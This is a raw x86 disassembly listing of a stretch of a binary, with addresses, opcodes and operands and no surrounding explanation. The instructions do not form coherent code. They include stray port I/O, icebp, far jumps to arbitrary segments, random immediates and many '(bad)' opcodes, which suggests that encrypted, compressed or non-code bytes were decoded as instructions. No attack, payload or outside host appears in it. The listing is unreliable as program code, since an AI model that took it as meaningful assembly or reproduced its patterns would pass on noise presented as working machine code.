  41d072:	push   ss
  41d073:	sub    BYTE PTR [esp+edx*2-0x10],0xe3
  41d078:	call   0x7e6d69b0
  41d07d:	fst    DWORD PTR [ebp-0x2a164974]
  41d083:	and    eax,0x1a889140
  41d088:	jns    0x41d0ae
  41d08a:	xor    eax,0xbede8a3a
  41d08f:	and    ebx,ecx
  41d091:	out    0xbb,eax
  41d093:	and    eax,0xb88f010e
  41d098:	pop    ss
  41d099:	icebp  
  41d09a:	lds    esi,FWORD PTR [ebp+0x64f86a2f]
  41d0a0:	fidivr WORD PTR [edi+0x68]
  41d0a3:	aaa    
  41d0a4:	fadd   st(3),st
  41d0a6:	and    cl,ch
  41d0a8:	out    dx,eax
  41d0a9:	in     al,0x54
  41d0ab:	mov    ds:0x26a8d84d,eax
  41d0b0:	shl    DWORD PTR [edi+edx*2-0x5efa5f36],cl
  41d0b7:	addr16 nop
  41d0b9:	cmp    al,0xda
  41d0bb:	(bad)  
  41d0bc:	mov    ebp,0x25394987
  41d0c1:	jne    0x41d0d7
  41d0c3:	mov    al,ds:0x9e298790
  41d0c8:	mov    bh,0x9f
  41d0ca:	iret   
  41d0cb:	outs   dx,BYTE PTR ds:[esi]
  41d0cc:	push   edi
  41d0cd:	sub    DWORD PTR ds:0xa6f3d3,ecx
  41d0d3:	into   
  41d0d4:	and    BYTE PTR [edx-0x9d7b840],0x7
  41d0db:	inc    ebp
  41d0dc:	and    edx,DWORD PTR [eax*1+0x2a9ba6e5]
  41d0e3:	xor    edi,edi
  41d0e5:	sbb    DWORD PTR [edx+0x38],0xac0b151a
  41d0ec:	aam    0x34
  41d0ee:	or     eax,0x600181c3
  41d0f3:	hlt    
  41d0f4:	cmp    edi,eax
  41d0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0f7:	repz in al,dx
  41d0f9:	xchg   ecx,eax
  41d0fa:	push   eax
  41d0fb:	mov    esi,0x40f6412f
  41d100:	and    BYTE PTR [ecx],bh
  41d102:	icebp  
  41d103:	jg     0x41d0bf
  41d105:	adc    dl,dl
  41d107:	rol    BYTE PTR [edi*1+0x381fff06],1
  41d10e:	mov    WORD PTR [eax+0x25],ds
  41d111:	dec    ebp
  41d112:	jbe    0x41d0e5
  41d114:	retf   
  41d115:	xor    ecx,DWORD PTR [ebp+ebx*1-0x46af65ce]
  41d11c:	jmp    0x27df:0x9ea64343
  41d123:	sub    BYTE PTR [ecx+0x405ad07f],bl
  41d129:	inc    ebp
  41d12a:	ja     0x41d181
  41d12c:	test   DWORD PTR [ecx],edx
  41d12e:	inc    edx
  41d12f:	in     al,dx
  41d130:	mov    ecx,ebp
  41d132:	mov    edx,0x8538b654
  41d137:	and    eax,0x1cfc75c
  41d13c:	mov    ds:0x895335b2,al
  41d141:	(bad)  
  41d142:	xlat   BYTE PTR ds:[ebx]
  41d143:	and    esp,DWORD PTR [ebx]
  41d145:	pop    ebx
  41d146:	(bad)  
  41d147:	mov    esp,0x967aabed
  41d14c:	xchg   ecx,eax
  41d14d:	je     0x41d1ab
  41d14f:	out    dx,al
  41d150:	outs   dx,DWORD PTR ds:[esi]
  41d151:	lock pop ebp
  41d153:	stos   DWORD PTR es:[edi],eax
  41d154:	shl    DWORD PTR [edx-0x4e6a726c],0x61
  41d15b:	sbb    al,BYTE PTR [eax]
  41d15d:	paddw  mm6,QWORD PTR [edx+0x3f564677]
  41d164:	enter  0x47ba,0xfd
  41d168:	repnz (bad) 
  41d16a:	xlat   BYTE PTR ds:[ebx]
  41d16b:	add    eax,0x73
  41d16e:	mov    bl,dh
  41d170:	cs adc eax,0x6197ec3e
  41d176:	sub    al,0x47
  41d178:	and    eax,0x6dad4c18
  41d17d:	cmp    bl,dh
  41d17f:	adc    bh,0x9f
  41d182:	mov    ds:0x52d902fa,eax
  41d187:	pusha  
  41d188:	pop    ecx
  41d189:	(bad)  
  41d18b:	ins    BYTE PTR es:[edi],dx
  41d18c:	mov    al,ds:0xcfa413f3
  41d191:	stos   BYTE PTR es:[edi],al
  41d192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d193:	mov    dh,0x8c
  41d195:	pop    ecx
  41d196:	jb     0x41d142
  41d198:	loope  0x41d1de
  41d19a:	jns    0x41d14f
  41d19c:	jnp    0x41d1c0
  41d19e:	or     eax,0xfdebfe3d
  41d1a3:	imul   ecx,DWORD PTR [esi],0xa4dc25f5
  41d1a9:	mov    ebx,0xe2aa0b05
  41d1ae:	push   esp
  41d1af:	push   0x86b9e3d6
  41d1b4:	daa    
  41d1b5:	ss aas 
  41d1b7:	or     BYTE PTR [eax+edi*4],0x5d
  41d1bb:	xchg   esi,eax
  41d1bc:	fist   DWORD PTR [edx-0x47aa8493]
  41d1c2:	cwde   
  41d1c3:	jb     0x41d184
  41d1c5:	stos   BYTE PTR es:[edi],al
  41d1c6:	adc    eax,0x9a8ceed3
  41d1cb:	push   esp
  41d1cc:	pop    ss
  41d1cd:	sub    ecx,DWORD PTR [edi+0x308ade1b]
  41d1d3:	jmp    0x1d5ecd95
  41d1d8:	sub    eax,0x64da3711
  41d1dd:	iret   
  41d1de:	enter  0x7fef,0x75
  41d1e2:	sbb    eax,0x9a0b6b06
  41d1e8:	mov    esi,0xdc489653
  41d1ed:	cmp    al,0xa8
  41d1ef:	sub    edi,ebx
  41d1f1:	je     0x41d17e
  41d1f3:	jnp    0x41d19c
  41d1f5:	test   DWORD PTR [esi-0x29],ebx
  41d1f8:	sub    bl,BYTE PTR [esi]
  41d1fa:	leave  
  41d1fb:	inc    eax
  41d1fc:	mov    eax,ds:0x1acadef6
  41d201:	mov    DWORD PTR ds:0x4944270a,eax
  41d207:	mov    dl,0x97
  41d209:	and    DWORD PTR [ebx+ebp*1-0x42],ebx
  41d20d:	pusha  
  41d20e:	fs jae 0x41d1f3
  41d211:	xchg   esi,eax
  41d212:	ins    BYTE PTR es:[edi],dx
  41d213:	sbb    al,0x3f
  41d215:	test   eax,0xa713ee5a
  41d21a:	jge    0x41d297
  41d21c:	aaa    
  41d21d:	dec    edx
  41d21e:	shr    bh,cl
  41d220:	outs   dx,DWORD PTR ds:[esi]
  41d221:	loop   0x41d23e
  41d223:	(bad)  
  41d224:	in     eax,0x86
  41d226:	int    0xcf
  41d228:	jge    0x41d240
  41d22a:	jo     0x41d1df
  41d22c:	dec    ecx
  41d22d:	dec    ebp
  41d22e:	adc    ecx,DWORD PTR [edx+0x7f]
  41d231:	or     eax,0x92a4ba5f
  41d236:	pushf  
  41d237:	pusha  
  41d238:	jle    0x41d1de
  41d23a:	popa   
  41d23b:	push   edx
  41d23c:	dec    ebx
  41d23d:	(bad)
  41d240:	fistp  WORD PTR [ebx+0x4b]
  41d243:	sahf   
  41d244:	call   0x58ae2313
  41d249:	adc    ah,BYTE PTR [ecx+esi*8]
  41d24c:	jns    0x41d1ed
  41d24e:	stos   BYTE PTR es:[edi],al
  41d24f:	sbb    eax,0x17954dc3
  41d254:	dec    ecx
  41d255:	jg     0x41d23b
  41d257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d258:	mov    al,ds:0xd5494bc
  41d25d:	pushf  
  41d25e:	lahf   
  41d25f:	dec    edx
  41d260:	dec    eax
  41d261:	(bad)  
  41d262:	mov    al,0x1f
  41d264:	mov    ebp,0x8c190c72
  41d269:	mov    cl,cl
  41d26b:	pop    edi
  41d26c:	and    DWORD PTR [ebp+0x20993fa],edi
  41d272:	scas   eax,DWORD PTR es:[edi]
  41d273:	std    
  41d274:	cld    
  41d275:	cs stc 
  41d277:	sbb    al,0xfd
  41d279:	xchg   edx,eax
  41d27a:	inc    ecx
  41d27b:	pop    eax
  41d27c:	fwait
  41d27d:	pop    ds
  41d27e:	cmp    DWORD PTR [ebx],0xfffffff4
  41d281:	push   esp
  41d282:	jo     0x41d2ee
  41d284:	(bad)  
  41d285:	xlat   BYTE PTR ds:[ebx]
  41d286:	jge    0x41d219
  41d288:	in     al,0x63
  41d28a:	ss hlt 
  41d28c:	gs scas al,BYTE PTR es:[edi]
  41d28e:	in     al,0xd1
  41d290:	scas   eax,DWORD PTR es:[edi]
  41d291:	mov    edi,0x73004402
  41d296:	pop    ecx
  41d297:	xor    eax,0xa7732cf1
  41d29c:	je     0x41d2d3
  41d29e:	cmp    eax,0xa6e3e344
  41d2a3:	loop   0x41d2d8
  41d2a5:	aas    
  41d2a6:	or     DWORD PTR [eax+edi*2+0x14567adb],0xffffffd0
  41d2ae:	or     bh,dh
  41d2b0:	daa    
  41d2b1:	aam    0x9d
  41d2b3:	ds dec edx
  41d2b5:	dec    ebp
  41d2b6:	loop   0x41d2d5
  41d2b8:	sbb    esp,DWORD PTR [ecx-0x29]
  41d2bb:	inc    ebx
  41d2bc:	leave  
  41d2bd:	push   es
  41d2be:	lods   al,BYTE PTR ds:[esi]
  41d2bf:	sbb    esi,DWORD PTR [esi]
  41d2c1:	sahf   
  41d2c2:	test   ecx,eax
  41d2c4:	push   esp
  41d2c5:	pop    ecx
  41d2c6:	mov    ebp,0x73a59a0e
  41d2cb:	push   cs
  41d2cc:	add    al,BYTE PTR [edi]
  41d2ce:	js     0x41d315
  41d2d0:	(bad)  
  41d2d1:	pop    edi
  41d2d2:	ins    DWORD PTR es:[edi],dx
  41d2d3:	mov    BYTE PTR [edi+0x7e6b69af],bl
  41d2d9:	xor    al,0x19
  41d2db:	jl     0x41d31d
  41d2dd:	sahf   
  41d2de:	ret    
  41d2df:	and    BYTE PTR [edi-0x68b96be3],dh
  41d2e5:	and    al,0xfe
  41d2e7:	xchg   edi,eax
  41d2e8:	mov    ss:0xb2e10e9c,al
  41d2ee:	xchg   edi,eax
  41d2ef:	push   eax
  41d2f0:	mov    eax,0x786cd7a0
  41d2f5:	les    esp,FWORD PTR [esp+edx*8]
  41d2f8:	fistp  WORD PTR [ebp-0x7e]
  41d2fb:	dec    ebx
  41d2fc:	ret    0x14d5
  41d2ff:	push   0x65f654c1
  41d304:	stos   DWORD PTR es:[edi],eax
  41d305:	and    ecx,DWORD PTR ds:0x2c47b3b4
  41d30b:	out    dx,al
  41d30c:	push   cs
  41d30d:	lods   al,BYTE PTR ds:[esi]
  41d30e:	add    eax,0x78bb7b4c
  41d313:	mov    edi,0xfa02ae5
  41d318:	add    BYTE PTR [edi],0x5
  41d31b:	mov    ah,0xf2
  41d31d:	(bad)  
  41d31e:	in     al,dx
  41d31f:	inc    edi
  41d320:	mov    ecx,0x5e4ea67d
  41d325:	mov    eax,0xe8d0c9b
  41d32a:	cmp    eax,0xe98956a8
  41d32f:	sub    BYTE PTR [esp+ebp*1-0xb4fdeb8],cl
  41d336:	fsub   DWORD PTR [ebp+0x1d]
  41d339:	imul   eax,DWORD PTR [edx],0xa4e8f6bd
  41d33f:	aam    0xd5
  41d341:	in     al,0x34
  41d343:	int3   
  41d344:	sahf   
  41d345:	nop
  41d346:	out    dx,al
  41d347:	push   ebx
  41d348:	(bad)  
  41d349:	sub    edi,DWORD PTR [ebx-0x1d]
  41d34c:	or     eax,0x88d0ede1
  41d351:	hlt    
  41d352:	fcmovu st,st(4)
  41d354:	add    DWORD PTR [ebx],ecx
  41d356:	jns    0x41d368
  41d358:	inc    edx
  41d359:	inc    esp
  41d35a:	dec    eax
  41d35b:	pusha  
  41d35c:	fild   WORD PTR [ecx-0x4a40a6f4]
  41d362:	lods   eax,DWORD PTR ds:[esi]
  41d363:	fs sbb al,0xc7
  41d366:	sti    
  41d367:	xor    eax,0x4b1f45f5
  41d36c:	retf   
  41d36d:	(bad)  
  41d36e:	jne    0x41d33c
  41d370:	mov    fs,WORD PTR [di+0x5b]
  41d374:	xchg   edx,eax
  41d375:	div    DWORD PTR [edi]
  41d377:	mov    edi,DWORD PTR [edi+0x6879ade9]
  41d37d:	mov    al,0x2e
  41d37f:	outs   dx,BYTE PTR ds:[esi]
  41d380:	data16 add al,0xd3
  41d383:	fcom   DWORD PTR [esi-0x3]
  41d386:	mov    al,ds:0x65f089e9
  41d38b:	test   eax,0x92351e
  41d390:	dec    eax
  41d391:	push   0xffffff8a
  41d393:	retf   
  41d394:	push   cs
  41d395:	dec    edx
  41d396:	lea    ebp,[edi-0x2dfde788]
  41d39c:	dec    edi
  41d39d:	popf   
  41d39e:	mov    cl,0xa3
  41d3a0:	(bad)  
  41d3a2:	iret   
  41d3a3:	mov    bl,0x22
  41d3a5:	std    
  41d3a6:	mov    eax,ds:0x342f9a8b
  41d3ab:	adc    ebx,DWORD PTR [eax]
  41d3ad:	xchg   ebp,eax
  41d3ae:	and    eax,0xbcbda6e4
  41d3b3:	xor    eax,DWORD PTR [ebp-0x564902fd]
  41d3b9:	pop    eax
  41d3ba:	jb     0x41d34d
  41d3bc:	sub    bh,cl
  41d3be:	jecxz  0x41d429
  41d3c0:	popa   
  41d3c1:	pop    edx
  41d3c2:	dec    esi
  41d3c3:	in     al,0x75
  41d3c5:	fcom   QWORD PTR [edi+0x7b]
  41d3c8:	jbe    0x41d3cf
  41d3ca:	scas   al,BYTE PTR es:[edi]
  41d3cb:	jbe    0x41d3bf
  41d3cd:	je     0x41d37b
  41d3cf:	jne    0x41d3c5
  41d3d1:	sahf   
  41d3d2:	sub    DWORD PTR [ebx+0x2a1b72df],0x58
  41d3d9:	xor    dl,dl
  41d3db:	out    0x32,al
  41d3dd:	sub    al,0xfe
  41d3df:	or     al,0x1c
  41d3e1:	jo     0x41d3bf
  41d3e3:	aad    0x8c
  41d3e5:	xchg   BYTE PTR [ebx-0x4a],dh
  41d3e8:	pop    edx
  41d3e9:	in     eax,dx
  41d3ea:	imul   edi,DWORD PTR [ebx-0x2da2bd26],0xffffffd4
  41d3f1:	mov    dh,0x4d
  41d3f3:	xlat   BYTE PTR ds:[ebx]
  41d3f4:	dec    esi
  41d3f5:	mov    ch,0xd5
  41d3f7:	sbb    DWORD PTR [edi-0x6c72cade],eax
  41d3fd:	imul   edx,edx,0xfd9d1579
  41d403:	and    dl,BYTE PTR [eax+0x1588996d]
  41d409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40a:	mov    edi,DWORD PTR [edx]
  41d40c:	inc    edi
  41d40d:	mov    cl,0xd1
  41d40f:	jae    0x41d3fe
  41d411:	pop    ss
  41d412:	xchg   edi,eax
  41d413:	push   ss
  41d414:	repz xchg ebp,eax
  41d416:	dec    eax
  41d417:	pop    esi
  41d418:	test   eax,0xceb7714b
  41d41d:	mov    eax,ds:0xe69932e8
  41d422:	pop    ebp
  41d423:	cs movmskps edx,xmm7
  41d427:	sbb    ch,dh
  41d429:	mov    bh,0xc8
  41d42b:	call   0x4387:0xd10e3447
  41d432:	in     al,0x1a
  41d434:	sub    BYTE PTR ds:0xee6341e1,ah
  41d43a:	mov    eax,ebx
  41d43c:	mul    edi
  41d43e:	pop    eax
  41d43f:	pop    edx
  41d440:	or     bl,cl
  41d442:	call   0xdef:0x8f0c3f73
  41d449:	(bad)  
  41d44b:	push   ebx
  41d44c:	imul   edx,DWORD PTR [edi+eax*1-0x308c57f6],0x88b9401e
  41d457:	in     eax,dx
  41d458:	mov    esp,0xf82a5e00
  41d45d:	push   esp
  41d45e:	xchg   ebx,eax
  41d45f:	mov    ch,0x23
  41d461:	inc    esi
  41d462:	int3   
  41d463:	std    
  41d464:	lahf   
  41d465:	dec    eax
  41d466:	or     dl,BYTE PTR [edx-0x7c2f0e9b]
  41d46c:	sbb    eax,0xd0d2c372
  41d471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d472:	or     ebp,DWORD PTR [ecx-0x77]
  41d475:	(bad)  
  41d476:	lds    edi,FWORD PTR [ecx+0x73]
  41d479:	out    dx,eax
  41d47a:	pop    eax
  41d47b:	dec    esp
  41d47c:	int3   
  41d47d:	std    
  41d47e:	inc    ebx
  41d47f:	repnz add al,0xed
  41d482:	inc    edx
  41d483:	add    eax,0x23d67227
  41d488:	xor    al,0x3c
  41d48a:	push   ss
  41d48b:	out    0x85,al
  41d48d:	ficomp WORD PTR [ebx]
  41d48f:	shl    BYTE PTR [ebx+ebx*2],cl
  41d492:	iret   
  41d493:	test   eax,0x6f90f165
  41d498:	adc    al,0xe3
  41d49a:	mov    edi,0xeb08cada
  41d49f:	in     eax,dx
  41d4a0:	cli    
  41d4a1:	int3   
  41d4a2:	push   ebp
  41d4a3:	popa   
  41d4a4:	jle    0x41d4ae
  41d4a6:	sub    DWORD PTR [eax-0x1b],0xffffff8e
  41d4aa:	ret    
  41d4ab:	pushf  
  41d4ac:	xchg   edx,eax
  41d4ad:	jge    0x41d509
  41d4af:	ins    BYTE PTR es:[edi],dx
  41d4b0:	aas    
  41d4b1:	retf   0xc1c
  41d4b4:	push   ebx
  41d4b5:	outs   dx,BYTE PTR ds:[esi]
  41d4b6:	sub    al,0xbe
  41d4b8:	stos   DWORD PTR es:[edi],eax
  41d4b9:	nop
  41d4ba:	xchg   ecx,eax
  41d4bb:	mov    dh,0x4d
  41d4bd:	lds    eax,FWORD PTR ds:0xe58d01ad
  41d4c3:	xchg   BYTE PTR [ebp+0x49],ch
  41d4c6:	mov    WORD PTR [eax+edx*8-0x64af2bef],es
  41d4cd:	rcr    DWORD PTR [edx],1
  41d4cf:	mov    ebx,0xb73bc927
  41d4d4:	xor    eax,0x259c9234
  41d4d9:	mov    DWORD PTR [esi+eax*2],0xc83cd810
  41d4e0:	rol    DWORD PTR ds:0x7e76322c,1
  41d4e6:	pop    edi
  41d4e7:	jge    0x41d481
  41d4e9:	dec    esp
  41d4ea:	sti    
  41d4eb:	mov    WORD PTR [ecx],?
  41d4ed:	dec    edx
  41d4ee:	rcr    DWORD PTR [edx],1
  41d4f0:	mov    eax,0xd2b33ee0
  41d4f5:	xchg   ebx,eax
  41d4f6:	rcr    DWORD PTR [ebp-0x5b695ea6],0x78
  41d4fd:	mov    cl,0x6d
  41d4ff:	ret    
  41d500:	es leave 
  41d502:	pop    es
  41d503:	jmp    0x421d6a8b
  41d508:	ins    DWORD PTR es:[edi],dx
  41d509:	dec    edx
  41d50a:	add    DWORD PTR [ebx],esi
  41d50c:	fwait
  41d50d:	push   0xffffffa8
  41d50f:	sub    DWORD PTR [ebp+0x62c49408],ebx
  41d515:	mov    BYTE PTR ds:0x10a06332,cl
  41d51b:	lods   eax,DWORD PTR ds:[esi]
  41d51c:	icebp  
  41d51d:	mov    ebx,0x76bba1b1
  41d522:	lods   al,BYTE PTR ds:[esi]
  41d523:	cmp    al,BYTE PTR [edx+0x195941ee]
  41d529:	(bad)  
  41d52a:	xchg   esp,eax
  41d52b:	fisttp QWORD PTR [esi-0x61]
  41d52e:	sbb    ch,0x83
  41d531:	pushf  
  41d532:	xchg   DWORD PTR [ecx-0x1f],eax
  41d535:	sbb    eax,0x6ef9b439
  41d53a:	jl     0x41d545
  41d53c:	lods   eax,DWORD PTR ds:[esi]
  41d53d:	test   al,0x23
  41d53f:	and    edi,DWORD PTR [edi]
  41d541:	cld    
  41d542:	xor    esi,DWORD PTR [ebx+0x22]
  41d545:	fcomp  DWORD PTR [eax]
  41d547:	sub    ah,BYTE PTR [esi]
  41d549:	dec    edx
  41d54a:	cdq    
  41d54b:	sbb    al,BYTE PTR ds:0x8e502a1f
  41d551:	bound  ebx,QWORD PTR [ebx+0x31f81f3b]
  41d557:	dec    ecx
  41d558:	mov    dl,0xd1
  41d55a:	cmp    al,0xff
  41d55c:	or     dh,0xac
  41d55f:	xchg   esp,eax
  41d560:	mov    BYTE PTR [ebp+0x556a749c],ah
  41d566:	popa   
  41d567:	jle    0x41d591
  41d569:	out    0x98,eax
  41d56b:	loope  0x41d577
  41d56d:	ficomp WORD PTR [esi]
  41d56f:	mov    al,ds:0xd25b4eb7
  41d574:	xchg   esi,eax
  41d575:	inc    edx
  41d576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d577:	add    al,bh
  41d579:	inc    ecx
  41d57a:	clc    
  41d57b:	inc    edx
  41d57c:	cmc    
  41d57d:	jno    0x41d5d8
  41d57f:	jae    0x41d525
  41d581:	cdq    
  41d582:	sbb    bh,BYTE PTR [esi-0x1cf0b438]
  41d588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d589:	dec    ebp
  41d58a:	fistp  WORD PTR [edx]
  41d58c:	stos   BYTE PTR es:[edi],al
  41d58d:	in     al,dx
  41d58e:	fwait
  41d58f:	adc    BYTE PTR [ecx+0x75],al
  41d592:	and    DWORD PTR [ebx+esi*1],0xffffffd0
  41d596:	in     al,0xb1
  41d598:	inc    ecx
  41d599:	dec    esi
  41d59a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d59b:	xlat   BYTE PTR ds:[ebx]
  41d59c:	lea    ecx,[edx-0x7d251ef9]
  41d5a2:	mov    BYTE PTR [ebx-0x21],al
  41d5a5:	add    al,0xe5
  41d5a7:	aaa    
  41d5a8:	shl    DWORD PTR [edi-0x6a856a25],cl
  41d5ae:	push   cs
  41d5af:	xor    DWORD PTR [ebp+0x79],ebp
  41d5b2:	clc    
  41d5b3:	ins    BYTE PTR es:[edi],dx
  41d5b4:	mov    al,ds:0xe5a2cca8
  41d5b9:	dec    ecx
  41d5ba:	xchg   esp,eax
  41d5bb:	gs jbe 0x41d611
  41d5be:	bound  sp,DWORD PTR [esi]
  41d5c1:	stc    
  41d5c2:	pop    ss
  41d5c3:	es scas al,BYTE PTR es:[edi]
  41d5c5:	add    eax,0xb2b00710
  41d5ca:	sbb    ebx,DWORD PTR [ebx]
  41d5cc:	cmp    al,0x98
  41d5ce:	sub    edi,DWORD PTR [edx-0x32]
  41d5d1:	or     al,0x45
  41d5d3:	mov    ah,0x8a
  41d5d5:	mov    eax,ds:0x41d7460b
  41d5da:	mov    eax,ds:0xb17cd889
  41d5df:	div    cl
  41d5e1:	jecxz  0x41d63a
  41d5e3:	enter  0x84c9,0x33
  41d5e7:	ins    DWORD PTR es:[edi],dx
  41d5e8:	retf   0x75e1
  41d5eb:	adc    esp,DWORD PTR [esi+edx*1]
  41d5ee:	rcl    BYTE PTR [ecx-0x6a325c2f],cl
  41d5f4:	mov    WORD PTR [ebp-0x22],ss
  41d5f7:	add    eax,0xdd693774
  41d5fc:	test   al,0x90
  41d5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5ff:	xchg   DWORD PTR [ecx+eax*4-0x5b],edi
  41d603:	xchg   esp,eax
  41d604:	xchg   edi,eax
  41d605:	cmp    BYTE PTR [edx],0x3b
  41d608:	call   0xc7e6:0xe20ff7ff
  41d60f:	cdq    
  41d610:	mov    dl,BYTE PTR [esi+edi*1]
  41d613:	add    BYTE PTR [ecx-0x5c],dl
  41d616:	ja     0x41d658
  41d618:	loop   0x41d61a
  41d61a:	cmp    bh,ch
  41d61c:	pushf  
  41d61d:	inc    esp
  41d61e:	ret    0x806
  41d621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d622:	sbb    al,0xb8
  41d624:	shl    BYTE PTR [edx-0x3af0946c],0xa0
  41d62b:	jne    0x41d618
  41d62d:	in     al,0x1b
  41d62f:	pushf  
  41d630:	add    al,0x42
  41d632:	sub    DWORD PTR [ebx-0x34c6432f],edx
  41d638:	aam    0x6f
  41d63a:	xchg   ebp,eax
  41d63b:	fidiv  WORD PTR [ebp+0x72eb7e48]
  41d641:	popa   
  41d642:	icebp  
  41d643:	arpl   WORD PTR [ebx-0x30],sp
  41d646:	rol    BYTE PTR [esi+edx*4-0x1064d948],0x78
  41d64e:	mov    al,0x11
  41d650:	sbb    al,0x98
  41d652:	push   ss
  41d653:	ffree  st(3)
  41d655:	dec    ebp
  41d656:	xchg   edx,eax
  41d657:	xor    BYTE PTR [ebp+esi*1-0x9],0xf0
  41d65c:	pop    ecx
  41d65d:	sbb    al,0x95
  41d65f:	retf   0x5786
  41d662:	push   esp
  41d663:	in     al,0x5f
  41d665:	jmp    0x1a41:0xb3f07f2e
  41d66c:	push   esp
  41d66d:	adc    eax,eax
  41d66f:	fsub   QWORD PTR [eax+esi*4+0x1b]
  41d673:	inc    edi
  41d674:	icebp  
  41d675:	pushf  
  41d676:	or     BYTE PTR [esi+0x13],bl
  41d679:	dec    ebp
  41d67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d67b:	pop    esp
  41d67c:	adc    bh,0x4e
  41d67f:	mov    bh,0x58
  41d681:	mov    ?,esp
  41d683:	not    DWORD PTR [eax-0x24afcf4b]
  41d689:	or     BYTE PTR [ebp-0x7b],al
  41d68c:	or     DWORD PTR [edx-0x1bb58bf5],ebx
  41d692:	sti    
  41d693:	mov    al,ds:0xfae1bc09
  41d698:	xchg   edx,eax
  41d699:	inc    ebp
  41d69a:	jle    0x41d6d2
  41d69c:	call   0xd771a1a7
  41d6a1:	ret    
  41d6a2:	popa   
  41d6a3:	cmp    al,0x3b
  41d6a5:	push   ebx
  41d6a6:	push   esp
  41d6a7:	out    dx,eax
  41d6a8:	add    eax,0xfea4f0ce
  41d6ad:	fwait
  41d6ae:	lods   al,BYTE PTR ds:[esi]
  41d6af:	in     eax,0x98
  41d6b1:	pop    ss
  41d6b2:	imul   ebp,DWORD PTR [ecx],0xac107a93
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	out    dx,al
  41d6ba:	stos   BYTE PTR es:[edi],al
  41d6bb:	sahf   
  41d6bc:	ret    0x1137
  41d6bf:	pop    ebx
  41d6c0:	lods   al,BYTE PTR ds:[esi]
  41d6c1:	test   DWORD PTR [eax],edx
  41d6c3:	sub    BYTE PTR [edi+ecx*8],ch
  41d6c6:	je     0x41d64d
  41d6c8:	xor    BYTE PTR [eax+0x46],bl
  41d6cb:	pop    ebp
  41d6cc:	jo     0x41d738
  41d6ce:	lods   al,BYTE PTR ds:[esi]
  41d6cf:	add    ebx,DWORD PTR [esi+0x37]
  41d6d2:	leave  
  41d6d3:	out    dx,eax
  41d6d4:	aam    0x40
  41d6d6:	xor    ah,ch
  41d6d8:	pop    eax
  41d6d9:	xchg   esi,eax
  41d6da:	int    0xb2
  41d6dc:	cmp    DWORD PTR [esi],0x73
  41d6df:	rcl    BYTE PTR ss:[ebp+0x5986e4b],cl
  41d6e6:	std    
  41d6e7:	mov    ebx,0x58b3da89
  41d6ec:	sti    
  41d6ed:	inc    esp
  41d6ee:	int    0xbd
  41d6f0:	lock imul esi,DWORD PTR [edx+eiz*8-0x31],0xffffffe6
  41d6f6:	and    BYTE PTR [edx+0x15085065],ch
  41d6fc:	dec    ebx
  41d6fd:	pusha  
  41d6fe:	pushf  
  41d6ff:	push   0x80ab3ddc
  41d704:	pop    ss
  41d705:	sbb    eax,0x102ccec5
  41d70a:	mov    ds:0xf5ee8257,eax
  41d70f:	jl     0x41d701
  41d711:	xchg   ebx,eax
  41d712:	mov    dh,0x4d
  41d714:	ret    0x83fa
  41d717:	and    al,0xca
  41d719:	imul   ebx,DWORD PTR [edi+eax*1],0x68093890
  41d720:	aam    0xbe
  41d722:	ss mov ah,0x96
  41d725:	jns    0x41d781
  41d727:	ins    DWORD PTR es:[edi],dx
  41d728:	push   ebx
  41d729:	pop    ecx
  41d72a:	sti    
  41d72b:	or     dl,bh
  41d72d:	fwait
  41d72e:	(bad)
  41d732:	mov    DWORD PTR ds:0x61913986,esp
  41d738:	or     eax,0xcada9bd8
  41d73d:	mov    bl,0x19
  41d73f:	test   eax,0x702df021
  41d744:	(bad)  
  41d745:	push   ss
  41d746:	xor    eax,0x67d821dc
  41d74b:	adc    dl,BYTE PTR [ebp+0x2]
  41d74e:	lods   al,BYTE PTR ds:[esi]
  41d74f:	pop    ss
  41d750:	inc    esp
  41d751:	adc    al,0x7
  41d753:	(bad)  
  41d755:	cmp    DWORD PTR [edx-0x6b],0xd6d518ef
  41d75c:	cdq    
  41d75d:	(bad)  
  41d75e:	mov    ah,0x20
  41d760:	pushf  
  41d761:	adc    DWORD PTR [eax-0x6480d736],0x7c
  41d768:	xor    BYTE PTR [ecx-0x7a],ch
  41d76b:	xor    DWORD PTR [edx+0x1c],edi
  41d76e:	out    dx,eax
  41d76f:	push   ss
  41d770:	sahf   
  41d771:	or     BYTE PTR [eax+0x1d273603],ah
  41d777:	loopne 0x41d6f9
  41d779:	ret    0x43f
  41d77c:	mov    ch,0xb
  41d77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d77f:	adc    ch,BYTE PTR [ecx+eiz*1]
  41d782:	fcom   DWORD PTR [eax+0xa]
  41d785:	jg     0x41d756
  41d787:	adc    DWORD PTR [eax+0x5e90c554],0x17
  41d78e:	in     al,dx
  41d78f:	or     al,0xca
  41d791:	fdivr  st(7),st
  41d793:	cmp    eax,0x80a152a8
  41d798:	rcl    BYTE PTR [ecx+0x44e08be2],1
  41d79e:	jmp    0x190480fc
  41d7a3:	push   ds
  41d7a4:	adc    al,0x8a
  41d7a6:	lods   al,BYTE PTR ds:[esi]
  41d7a7:	ficom  DWORD PTR [edi-0x2da5c0e3]
  41d7ad:	mov    ebx,0xdcf0ac79
  41d7b2:	stos   DWORD PTR es:[edi],eax
  41d7b3:	retf   0xcd0f
  41d7b6:	arpl   sp,bp
  41d7b8:	mov    ds:0xfdeabf7c,eax
  41d7bd:	bound  edi,QWORD PTR [edx+0x7ca95ca9]
  41d7c3:	aaa    
  41d7c4:	push   0x7bf69446
  41d7c9:	pop    ebx
  41d7ca:	sub    DWORD PTR [edi+0x7310a841],0x8952c7fd
  41d7d4:	add    eax,0x463c2c5d
  41d7d9:	mov    dl,0x33
  41d7db:	sbb    eax,0x4af4aa3f
  41d7e0:	xor    al,BYTE PTR [edx*8+0x2faab912]
  41d7e7:	add    BYTE PTR [edx],ah
  41d7e9:	jnp    0x41d7ee
  41d7eb:	pop    ds
